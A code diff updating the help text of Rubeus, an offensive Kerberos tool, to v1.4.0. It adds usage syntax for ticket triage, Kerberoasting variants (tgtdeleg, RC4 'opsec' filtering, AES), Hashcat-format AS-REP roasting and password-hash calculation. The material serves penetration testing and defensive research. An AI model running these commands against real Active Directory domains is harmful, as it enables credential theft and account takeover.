@@ -12,7 +12,7 @@ namespace Rubeus.Domain
             Console.WriteLine("  |  __  /| | | |  _ \\| ___ | | | |/___)");
             Console.WriteLine("  | |  \\ \\| |_| | |_) ) ____| |_| |___ |");
             Console.WriteLine("  |_|   |_|____/|____/|_____)____/(___/\r\n");
-            Console.WriteLine("  v1.3.2\r\n");
+            Console.WriteLine("  v1.4.0\r\n");
         }
 
         public static void ShowUsage()
@@ -21,10 +21,10 @@ namespace Rubeus.Domain
 Ticket requests and renewals:
 
     Retrieve a TGT based on a user password/hash, optionally applying to the current logon session or a specific LUID:
-        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:RC4|AES256] | /rc4:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
 
     Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
-        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:RC4|AES256] |/rc4:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
+        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
 
     Retrieve a service ticket for one or more SPNs, optionally applying the ticket:
         Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/dc:DOMAIN_CONTROLLER] [/ptt]
@@ -54,7 +54,10 @@ Ticket management:
 
 Ticket extraction and harvesting:
 
-    List all current tickets (if elevated, list for all users), optionally targeting a specific LUID:
+    Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:
+        Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:LDAP]
+
+    List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID:
         Rubeus.exe klist [/luid:LOGINID]
 
     Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
@@ -73,19 +76,31 @@ Ticket extraction and harvesting:
 Roasting:
 
     Perform Kerberoasting:
-        Rubeus.exe kerberoast [/spn:""blah/blah""] [/user:USER] [/ou:""OU,...""]
+        Rubeus.exe kerberoast [/spn:""blah/blah""] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
 
     Perform Kerberoasting, outputting hashes to a file:
-        Rubeus.exe kerberoast /outfile:hashes.txt [/spn:""blah/blah""] [/user:USER] [/ou:""OU,...""]
+        Rubeus.exe kerberoast /outfile:hashes.txt [/spn:""blah/blah""] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
 
     Perform Kerberoasting with alternate credentials:
-        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:""blah/blah""] [/user:USER] [/ou:""OU,...""]
+        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:""blah/blah""] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
+
+    Perform Kerberoasting with an existing TGT:
+        Rubeus.exe kerberoast /spn:""blah/blah"" </ticket:BASE64 | /ticket:FILE.KIRBI>
+
+    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
+        Rubeus.exe kerberoast /usetgtdeleg
+
+    Perform ""opsec"" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
+        Rubeus.exe kerberoast /rc4opsec
+
+    Perform AES Kerberoasting:
+        Rubeus.exe kerberoast /aes
 
     Perform AS-REP ""roasting"" for any users without preauth:
-        Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU,...""]
+        Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
 
-    Perform AS-REP ""roasting"" for any users without preauth, outputting hashes to a file:
-        Rubeus.exe asreproast /outfile:hashes.txt [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU,...""]
+    Perform AS-REP ""roasting"" for any users without preauth, outputting Hashcat format to a file:
+        Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
 
     Perform AS-REP ""roasting"" for any users without preauth using alternate credentials:
         Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU,...""]
@@ -98,6 +113,9 @@ Miscellaneous:
 
     Reset a user's password from a supplied TGT (AoratoPw):
         Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER]
+
+    Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes:
+        Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]
 
 
 NOTE: Base64 ticket blobs can be decoded with :
